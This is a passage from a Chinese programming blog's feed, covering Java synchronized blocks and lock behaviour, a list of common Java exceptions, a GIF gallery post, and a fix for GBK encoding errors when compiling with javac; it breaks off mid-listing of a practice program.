<p>&nbsp;&nbsp;&nbsp;&nbsp;当在某个线程中执行这段代码块，该线程会获取对象<code>synObject</code>的锁，从而使得其他线程无法同时访问该代码块。<br><code>synObject</code>可以是this，代表获取当前对象的锁，也可以是类中的一个属性，代表获取该属性的锁。<br>比如上面的<code>insert</code>方法可以改成以下两种形式：<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">class</span> <span class="title">InsertData</span> &#123;</div><div class="line">    <span class="keyword">private</span> ArrayList&lt;Integer&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</div><div class="line">     </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span>(<span class="params">Thread thread</span>)</span>&#123;</div><div class="line">        synchronized (<span class="keyword">this</span>) &#123;</div><div class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</div><div class="line">                System.<span class="keyword">out</span>.println(thread.getName()+<span class="string">"在插入数据"</span>+i);</div><div class="line">                arrayList.<span class="keyword">add</span>(i);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">class</span> <span class="title">InsertData</span> &#123;</div><div class="line">    <span class="keyword">private</span> ArrayList&lt;Integer&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</div><div class="line">    <span class="keyword">private</span> Object <span class="keyword">object</span> = <span class="keyword">new</span> Object();</div><div class="line">     </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span>(<span class="params">Thread thread</span>)</span>&#123;</div><div class="line">        synchronized (<span class="keyword">object</span>) &#123;</div><div class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</div><div class="line">                System.<span class="keyword">out</span>.println(thread.getName()+<span class="string">"在插入数据"</span>+i);</div><div class="line">                arrayList.<span class="keyword">add</span>(i);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>&nbsp;&nbsp;&nbsp;&nbsp;从上面可以看出，<code>synchronized</code>代码块使用起来比<code>synchronized</code>方法要灵活得多。因为也许一个方法中只有一部分代码只需要同步，如果此时对整个方法用<code>synchronized</code>进行同步，会影响程序执行效率。而使用<code>synchronized</code>代码块就可以避免这个问题，<code>synchronized</code>代码块可以实现只对需要同步的地方进行同步。<br>另外，每个类也会有一个锁，它可以用来控制对<code>static</code>数据成员的并发访问。<br>&nbsp;&nbsp;&nbsp;&nbsp;并且如果一个线程执行一个对象的非<code>static synchronized</code>方法，另外一个线程需要执行这个对象所属类的<code>static synchronized</code>方法，此时不会发生互斥现象，因为访问<code>static synchronized</code>方法占用的是类锁，而访问非<code>static synchronizedstatic synchronized</code>方法占用的是对象锁，所以不存在互斥现象。<br>看下面这段代码就明白了：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">mc_07301</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</div><div class="line">        <span class="keyword">final</span> InsertData insertData = <span class="keyword">new</span> InsertData();</div><div class="line">        <span class="keyword">new</span> Thread()&#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</div><div class="line">                insertData.insert();</div><div class="line">            &#125;</div><div class="line">        &#125;.start();</div><div class="line"></div><div class="line">        <span class="keyword">new</span> Thread()&#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</div><div class="line">                insertData.insert1();</div><div class="line">            &#125;</div><div class="line">        &#125;.start();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">InsertData</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">()</span> </span>&#123;</div><div class="line">        System.out.println(<span class="string">"执行insert"</span>);</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            Thread.sleep(<span class="number">5000</span>);</div><div class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">        System.out.println(<span class="string">"执行insert完毕"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">insert1</span><span class="params">()</span> </span>&#123;</div><div class="line">        System.out.println(<span class="string">"执行insert1"</span>);</div><div class="line">        System.out.println(<span class="string">"执行insert1完毕"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>执行结果：<br><img src="https://github.com/sunstady/hexo/blob/master/synchronized/3.jpg?raw=true" alt="3"></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;第一个线程里面执行的是<code>insert</code>方法，不会导致第二个线程执行<code>insert1</code>方法发生阻塞现象。<br>&nbsp;&nbsp;&nbsp;&nbsp;下面我们看一下<code>synchronized</code>关键字到底做了什么事情，我们来反编译它的字节码看一下，下面这段代码反编译后的字节码为：<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">InsertData</span> &#123;</div><div class="line">    <span class="keyword">private</span> Object <span class="keyword">object</span> = <span class="keyword">new</span> Object();</div><div class="line">     </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span>(<span class="params">Thread thread</span>)</span>&#123;</div><div class="line">        synchronized (<span class="keyword">object</span>) &#123;</div><div class="line">         </div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">     </div><div class="line">    <span class="function"><span class="keyword">public</span> synchronized <span class="keyword">void</span> <span class="title">insert1</span>(<span class="params">Thread thread</span>)</span>&#123;</div><div class="line">         </div><div class="line">    &#125;</div><div class="line">     </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert2</span>(<span class="params">Thread thread</span>)</span>&#123;</div><div class="line">         </div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/sunstady/hexo/blob/master/synchronized/4.jpg?raw=true" alt="4"><br>&nbsp;&nbsp;&nbsp;&nbsp;从反编译获得的字节码可以看出，<code>synchronized</code>代码块实际上多了<code>monitorenter</code>和<code>monitorexit</code>两条指令。<code>monitorenter</code>指令执行时会让对象的锁计数加1，而<code>monitorexit</code>指令执行时会让对象的锁计数减1，其实这个与操作系统里面的PV操作很像，操作系统里面的PV操作就是用来控制多个线程对临界资源的访问。对于<code>synchronized</code>方法，执行中的线程识别该方法的<code>method_info</code>结构是否有<code>ACC_SYNCHRONIZED</code>标记设置，然后它自动获取对象的锁，调用方法，最后释放锁。如果有异常发生，线程自动释放锁。<br>有一点要注意：<code>对于synchronized方法或者synchronized代码块，当出现异常时，JVM会自动释放当前线程占用的锁，因此不会由于异常导致出现死锁现象</code>。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;RT&lt;br&gt;
    
    </summary>
    
    
      <category term="Java" scheme="http://www.sanstylemc.cn/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java常见的异常种类</title>
    <link href="http://www.sanstylemc.cn/2018/07/30/Java%E5%B8%B8%E8%A7%81%E7%9A%84%E5%BC%82%E5%B8%B8%E7%A7%8D%E7%B1%BB/"/>
    <id>http://www.sanstylemc.cn/2018/07/30/Java常见的异常种类/</id>
    <published>2018-07-30T06:52:05.000Z</published>
    <updated>2018-07-30T06:53:07.592Z</updated>
    
    <content type="html"><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;异常类分为两大类型：Error类代表了编译和系统的错误，不允许捕获；Exception类代表了标准Java库方法所激发的异常。Exception类还包含运行异常类Runntime_Exception和非运行异常类Non_RuntimeException这两个直接的子类。<br><a id="more"></a></p>
<h2 id="常见的异常"><a href="#常见的异常" class="headerlink" title="常见的异常"></a>常见的异常</h2><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;运行异常类对应于编译错误，它是指Java程序在运行时产生的由解释器引发的各种异常。运行异常可能出现在任何地方，且出现频率很高，因此为了避免巨大的系统资源开销，编译器不对异常进行检查。所以Java语言中的运行异常不一定被捕获。出现运行错误往往表示代码有错误，如：算数异常（如被0除）、下标异常（如数组越界）等。<br>&nbsp;&nbsp;&nbsp;&nbsp;非运行异常时Non_RuntimeException类及其子类的实例，又称为可检测异常。Java编译器利用分析方法或构造方法中可能产生的结果来检测Java程序中是否含有检测异常的处理程序，对于每个可能的可检测异常，方法或构造方法的throws子句必须列出该异常对应的类。在Java的标准包java.lang java.util 和 java.net 中定义的异常都是非运行异常。</p>
<h3 id="常见异常种类"><a href="#常见异常种类" class="headerlink" title="常见异常种类"></a>常见异常种类</h3><p>算术异常类：<code>ArithmeticExecption</code><br>&nbsp;&nbsp;&nbsp;&nbsp;比如程序中出现了除以零这样的运算就会出这样的异常。</p>
<p>空指针异常类：<code>NullPointerException</code><br>&nbsp;&nbsp;&nbsp;&nbsp;调用了未经初始化的对象或者是不存在的对象。</p>
<p>类型强制转换异常：<code>ClassCastException</code><br>&nbsp;&nbsp;&nbsp;&nbsp;是JVM在检测到两个类型间转换不兼容时引发的运行时异常，此类错误通常会终止用户请求。</p>
<p>数组下标越界异常：<code>ArrayIndexOutOfBoundsException</code><br>&nbsp;&nbsp;&nbsp;&nbsp;一般是数组下标超出了数组的范围，一般来说，显示(即直接用常数当下标)调用不太容易出这样的错，但隐式(即用变量表示下标)调用就经常出错了。还有一种情况，是程序中定义的数组的长度是通过某些特定方法决定的，不是事先声明的。</p>
<p>文件未找到异常：<code>FileNotFoundException</code><br>&nbsp;&nbsp;&nbsp;&nbsp;文件不存在或者没有权限操作文件的时候报错。</p>
<p>操作数据库异常：<code>SQLException</code><br>&nbsp;&nbsp;&nbsp;&nbsp;当使用JDBC与数据库进行交互的时候可能会遇见错误，将会抛出此异常。一个SQLException的异常里面包含以下信息，用于帮助我们更好的定位错误。<br>1、错误表示：使用<code>getMessage</code>方法便可以获取。<br>2、SQLState代码：代码有五位的字母和数字组成。多数的代码又ISO/ANSI和Open Group(X/Open)标准化，但是仍然存在部分的代码由数据库提供商自行实现。<br>3、错误代码：与SQLState不同，错误代码是由数据库提供商自行定义的整数值，存在是由基础数据源返回的实际错误代码的可能。使用<code>getErrorCode</code>方法便可以获取。<br>4、错误原因：表示引发异常的原因，通过不断调用<code>getCause</code>方法可以获取异常发生的底层原因。<br>5、异常链：如果出现多个错误，则通过此链引用异常。使用<code>getNextException</code>方法便可以获取。</p>
<p>方法未找到异常：<code>NoSuchMethodException</code><br>未找到对应的方法，看看方法名和发送请求的方法名是否一致。</p>
<h2 id="捕获异常的方法"><a href="#捕获异常的方法" class="headerlink" title="捕获异常的方法"></a>捕获异常的方法</h2><p>1、<code>throw</code>就是抛出一个异常，并获取这个异常的引用，这个异常会被抛到外部的环境，由外部环境进行处理。<br>2、<code>throws</code>并不是抛出一个实际的Exception而是一个异常声明，它声明这个方法可能会抛出一个异常，所以在没有异常的情况下也是可以用throws的，而throws本身的作用也是用来提高程序的健壮性，反过来，如果这个方法的确是有一个异常，那么编译器会强制让你加上throws这个异常声明。通常throws是写在参数列表的后面，这样就表明这个方法可能会抛出一个异常。<br>3、<code>Try catch</code>块，try里经常放上可能会抛出异常的程序段，而catch恰好就是处理try里抛出的异常。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;异常类分为两大类型：Error类代表了编译和系统的错误，不允许捕获；Exception类代表了标准Java库方法所激发的异常。Exception类还包含运行异常类Runntime_Exception和非运行异常类Non_RuntimeException这两个直接的子类。&lt;br&gt;
    
    </summary>
    
    
      <category term="Interview" scheme="http://www.sanstylemc.cn/tags/Interview/"/>
    
  </entry>
  
  <entry>
    <title>一如少年模样</title>
    <link href="http://www.sanstylemc.cn/2018/07/28/%E4%B8%80%E5%A6%82%E5%B0%91%E5%B9%B4%E6%A8%A1%E6%A0%B7/"/>
    <id>http://www.sanstylemc.cn/2018/07/28/一如少年模样/</id>
    <published>2018-07-28T01:54:51.000Z</published>
    <updated>2018-07-28T01:56:29.038Z</updated>
    
    <content type="html"><![CDATA[<p><code>一如少年模样 风雨不挡</code><br><a id="more"></a><br><img src="https://github.com/sunstady/hexo/blob/eb47b1719cf1bf2f977da4fdc2f7b31d21f6bf67/Gif/Gifs/1.gif?raw=true" alt="1"><br><img src="https://github.com/sunstady/hexo/blob/eb47b1719cf1bf2f977da4fdc2f7b31d21f6bf67/Gif/Gifs/2.gif?raw=true" alt="2"><br><img src="https://github.com/sunstady/hexo/blob/eb47b1719cf1bf2f977da4fdc2f7b31d21f6bf67/Gif/Gifs/3.gif?raw=true" alt="3"><br><img src="https://github.com/sunstady/hexo/blob/5ab4c4dcea7dc703dad27430175e375fb0e99486/Gif/Gifs/4.gif?raw=true" alt="4"><br><img src="https://github.com/sunstady/hexo/blob/5ab4c4dcea7dc703dad27430175e375fb0e99486/Gif/Gifs/5.gif?raw=true" alt="5"><br><img src="https://github.com/sunstady/hexo/blob/5ab4c4dcea7dc703dad27430175e375fb0e99486/Gif/Gifs/6.gif?raw=true" alt="6"><br><img src="https://github.com/sunstady/hexo/blob/f566f83040f15c591e151d959d61af26798d8519/Gif/Gifs/10.gif?raw=true" alt="7"><br><img src="https://github.com/sunstady/hexo/blob/f566f83040f15c591e151d959d61af26798d8519/Gif/Gifs/11.gif?raw=true" alt="8"><br><img src="https://github.com/sunstady/hexo/blob/f566f83040f15c591e151d959d61af26798d8519/Gif/Gifs/12.gif?raw=true" alt="9"><br><img src="https://github.com/sunstady/hexo/blob/f566f83040f15c591e151d959d61af26798d8519/Gif/Gifs/13.gif?raw=true" alt="10"><br><img src="https://github.com/sunstady/hexo/blob/f566f83040f15c591e151d959d61af26798d8519/Gif/Gifs/14.gif?raw=true" alt="11"><br><img src="https://github.com/sunstady/hexo/blob/f566f83040f15c591e151d959d61af26798d8519/Gif/Gifs/15.gif?raw=true" alt="12"><br><img src="https://github.com/sunstady/hexo/blob/f566f83040f15c591e151d959d61af26798d8519/Gif/Gifs/16.gif?raw=true" alt="13"><br><img src="https://github.com/sunstady/hexo/blob/f566f83040f15c591e151d959d61af26798d8519/Gif/Gifs/17.gif?raw=true" alt="14"><br><img src="https://github.com/sunstady/hexo/blob/f566f83040f15c591e151d959d61af26798d8519/Gif/Gifs/18.gif?raw=true" alt="15"><br><img src="https://github.com/sunstady/hexo/blob/f566f83040f15c591e151d959d61af26798d8519/Gif/Gifs/19.gif?raw=true" alt="16"><br><img src="https://github.com/sunstady/hexo/blob/f566f83040f15c591e151d959d61af26798d8519/Gif/Gifs/21.gif?raw=true" alt="17"><br><img src="https://github.com/sunstady/hexo/blob/f566f83040f15c591e151d959d61af26798d8519/Gif/Gifs/22.gif?raw=true" alt="18"><br><img src="https://github.com/sunstady/hexo/blob/f566f83040f15c591e151d959d61af26798d8519/Gif/Gifs/23.gif?raw=true" alt="19"><br><img src="https://github.com/sunstady/hexo/blob/f566f83040f15c591e151d959d61af26798d8519/Gif/Gifs/25.gif?raw=true" alt="20"><br><img src="https://github.com/sunstady/hexo/blob/f566f83040f15c591e151d959d61af26798d8519/Gif/Gifs/26.gif?raw=true" alt="21"><br><img src="https://github.com/sunstady/hexo/blob/f566f83040f15c591e151d959d61af26798d8519/Gif/Gifs/27.gif?raw=true" alt="22"><br><img src="https://github.com/sunstady/hexo/blob/f566f83040f15c591e151d959d61af26798d8519/Gif/Gifs/28.gif?raw=true" alt="23"><br><img src="https://github.com/sunstady/hexo/blob/f566f83040f15c591e151d959d61af26798d8519/Gif/Gifs/29.gif?raw=true" alt="24"><br><img src="https://github.com/sunstady/hexo/blob/f566f83040f15c591e151d959d61af26798d8519/Gif/Gifs/7.gif?raw=true" alt="25"><br><img src="https://github.com/sunstady/hexo/blob/f566f83040f15c591e151d959d61af26798d8519/Gif/Gifs/8.gif?raw=true" alt="26"><br><img src="https://github.com/sunstady/hexo/blob/f566f83040f15c591e151d959d61af26798d8519/Gif/Gifs/9.gif?raw=true" alt="27"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;一如少年模样 风雨不挡&lt;/code&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="Essay" scheme="http://www.sanstylemc.cn/tags/Essay/"/>
    
  </entry>
  
  <entry>
    <title>编码GBK的不可映射字符</title>
    <link href="http://www.sanstylemc.cn/2018/07/27/%E7%BC%96%E7%A0%81GBK%E7%9A%84%E4%B8%8D%E5%8F%AF%E6%98%A0%E5%B0%84%E5%AD%97%E7%AC%A6/"/>
    <id>http://www.sanstylemc.cn/2018/07/27/编码GBK的不可映射字符/</id>
    <published>2018-07-27T01:05:03.000Z</published>
    <updated>2018-07-27T01:06:51.353Z</updated>
    
    <content type="html"><![CDATA[<p>背景：在eclipse中可以正常运行，eclipse的编码是UTF-8；在CMD中通过javac运行则显示<code>错误：编码GBK的不可映射字符</code>。<br><a id="more"></a></p>
<p><img src="https://github.com/sunstady/hexo/blob/master/CMD_GBK%E7%BC%96%E7%A0%81%E9%94%99%E8%AF%AF/1.png?raw=true" alt="1"><br>解决方法：<br>1、保证CMD的编码是936，即<code>chcp 936</code>。<br><code>chcp 936</code>是GBK, <code>chcp 65001</code>是UTF-8。<br>2、保证Java文件的编码是UTF-8。<br><img src="https://github.com/sunstady/hexo/blob/master/CMD_GBK%E7%BC%96%E7%A0%81%E9%94%99%E8%AF%AF/3.png?raw=true" alt="3"><br>3、在CMD中执行javac的命令改为<code>javac -encoding utf-8 -d . 文件名.java</code><br>比如我的就是<code>javac -encoding utf-8 -d . Main.java</code><br><img src="https://github.com/sunstady/hexo/blob/master/CMD_GBK%E7%BC%96%E7%A0%81%E9%94%99%E8%AF%AF/2/2.png?raw=true" alt="2"></p>
<p>附上源码供测试，有不当的地方请指正=-=！<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div><div class="line">336</div><div class="line">337</div><div class="line">338</div><div class="line">339</div><div class="line">340</div><div class="line">341</div><div class="line">342</div><div class="line">343</div><div class="line">344</div><div class="line">345</div><div class="line">346</div><div class="line">347</div><div class="line">348</div><div class="line">349</div><div class="line">350</div><div class="line">351</div><div class="line">352</div><div class="line">353</div><div class="line">354</div><div class="line">355</div><div class="line">356</div><div class="line">357</div><div class="line">358</div><div class="line">359</div><div class="line">360</div><div class="line">361</div><div class="line">362</div><div class="line">363</div><div class="line">364</div><div class="line">365</div><div class="line">366</div><div class="line">367</div><div class="line">368</div><div class="line">369</div><div class="line">370</div><div class="line">371</div><div class="line">372</div><div class="line">373</div><div class="line">374</div><div class="line">375</div><div class="line">376</div><div class="line">377</div><div class="line">378</div><div class="line">379</div><div class="line">380</div><div class="line">381</div><div class="line">382</div><div class="line">383</div><div class="line">384</div><div class="line">385</div><div class="line">386</div><div class="line">387</div><div class="line">388</div><div class="line">389</div><div class="line">390</div><div class="line">391</div><div class="line">392</div><div class="line">393</div><div class="line">394</div><div class="line">395</div><div class="line">396</div><div class="line">397</div><div class="line">398</div><div class="line">399</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.util.Arrays;</div><div class="line"><span class="keyword">import</span> java.util.Scanner;</div><div class="line"></div><div class="line"><span class="keyword">public</span> class Main &#123;</div><div class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args) &#123;</div><div class="line">		System.out.<span class="built_in">println</span>(</div><div class="line">				<span class="string">"1、两个乒乓球队进行比赛，各出三人。甲队为a,b,c三人，乙队为x,y,z三人。已抽签决定比赛名单。有人向队员打听比赛的名单。a说他不和x比，c说他不和x,z比，请编程序找出三队赛手的名单"</span>);</div><div class="line">		System.out.<span class="built_in">println</span>(<span class="string">"2、一个5位数，判断它是不是回文数。即12321是回文数，个位与万位相同，十位与千位相同 "</span>);</div><div class="line">		System.out.<span class="built_in">println</span>(<span class="string">"3、有五个学生，每个学生有3门课的成绩，从键盘输入以上数据（包括学生号，姓名，三门课成绩），计算出平均成绩"</span>);</div><div class="line">		System.out.<span class="built_in">println</span>(<span class="string">"4、将一个数组逆序输出"</span>);</div><div class="line">		System.out.<span class="built_in">println</span>(<span class="string">"5、有一个已经排好序的数组。现输入一个数，要求按原来的规律将它插入数组中"</span>);</div><div class="line">		System.out.<span class="built_in">println</span>(<span class="string">"6、打印出杨辉三角形(要求打印出10行)"</span>);</div><div class="line">		System.out.<span class="built_in">println</span>(<span class="string">"7、输入数组，最大的与第一个元素交换，最小的与最后一个元素交换，输出数组"</span>);</div><div class="line">		System.out.<span class="built_in">println</span>(<span class="string">"8、字符串数组排序"</span>);</div><div class="line">		System.out.<span class="built_in">println</span>(<span class="string">"9、有n个人围成一圈，顺序排号。从第一个人开始报数（从1到3报数），凡报到3的人退出圈子，问最后留下的是原来第几号的那位"</span>);</div><div class="line">		System.out.<span class="built_in">println</span>(<span class="string">"0、退出"</span>);</div><div class="line">		System.out.<span class="built_in">println</span>(<span class="string">"请输入要演示的题目序号: "</span>);</div><div class="line">		Scanner sc = <span class="keyword">new</span> Scanner(System.in);</div><div class="line">		<span class="keyword">String</span> pa = <span class="string">"\\d&#123;1&#125;"</span>;</div><div class="line">		<span class="keyword">String</span> str = sc.next();</div><div class="line"></div><div class="line">		<span class="built_in">if</span> (str.matches(pa)) &#123;</div><div class="line">			<span class="keyword">int</span> num = Integer.<span 